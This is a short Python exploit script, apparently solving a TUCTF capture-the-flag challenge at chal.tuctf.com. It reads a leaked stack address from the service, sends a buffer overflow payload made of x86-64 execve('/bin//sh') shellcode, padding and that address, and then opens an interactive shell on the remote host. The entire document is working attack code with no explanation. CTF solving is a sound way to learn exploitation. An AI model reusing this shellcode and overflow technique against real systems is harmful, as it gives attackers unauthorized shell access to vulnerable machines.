#!/usr/bin/env python3

#-*- coding: utf-8 -*-
import socket
from time import sleep
import struct
import telnetlib
import os


def connect( ip, port ):
    return socket.create_connection((ip, port))

def p( x ):
    return struct.pack('<I', x )

def p64( x ):
    return struct.pack('<Q', x )

def u( x ):
    return struct.unpack('<I', x )[0]

def u64( x ):
    return struct.unpack('<Q', x )[0]

def interact( s ):
    print('----- interactive mode -----')
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def main():
    s = connect('chal.tuctf.com', 30507 )
    
    rec = s.recv( 1000 )
    addr = int( rec.split(b'\n')[1][2:], 16 )
    print( '%x'%addr )
    shellcode = b'\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'
    payload = shellcode
    payload += b'A'*(0x28 - len( shellcode ))
    payload += p64( addr )
    payload += b'\n'
    
    with open("attack", "wb" ) as f:
        f.write( payload )
    
    sleep( 1 )
    s.sendall( payload )
    interact( s )

if( __name__ == '__main__' ): main()
